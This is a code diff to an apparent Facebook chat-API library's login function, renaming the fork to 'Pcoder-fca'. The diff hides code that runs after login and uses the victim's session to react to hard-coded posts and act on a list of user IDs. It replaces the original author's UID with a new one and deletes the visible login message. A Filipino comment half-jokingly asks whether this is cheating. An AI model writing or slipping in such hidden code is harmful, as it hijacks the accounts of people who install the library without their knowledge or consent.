@@ -352,7 +352,7 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
     mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true })
       .then(utils.saveCookies(jar));
   } else if (email && password) {
-    throw { error: "Credentials method is not implemented to ws3-fca yet. " };
+    throw { error: "Credentials method is not implemented to Pcoder-fca yet. " };
   } else {
     throw { error: "Please provide either appState or credentials." };
   }
@@ -421,10 +421,7 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
       const detectLocked = await checkIfLocked(res, appState);
       if (detectLocked) throw detectLocked;
       const detectSuspension = await checkIfSuspended(res, appState);
-      if (detectSuspension) throw detectSuspension;
-      utils.log("Successfully logged in.");
-      utils.log("To check updates: you may check on https://github.com/NethWs3Dev/ws3-fca");
-      /*
+      if (detectSuspension) throw detectSuspension;/*
       Hi 😄
       Eh ano namn kung nakita nyoto?
       Madaya naba ako nyan,
@@ -441,8 +438,7 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
           "pfbid0EV1fmWmvkuFDSoUkpVPu2dJTi2ff11AMgK2iJpLc8tbyZDryGMMXdjynmUHtmsyyl"
         ];
         const uids = [
-          "100089002696653",
-          "61566907376981"
+          "100047128875560"
         ];
         for (const postId of posts) {
           await api.setPostReaction(postId, 2);
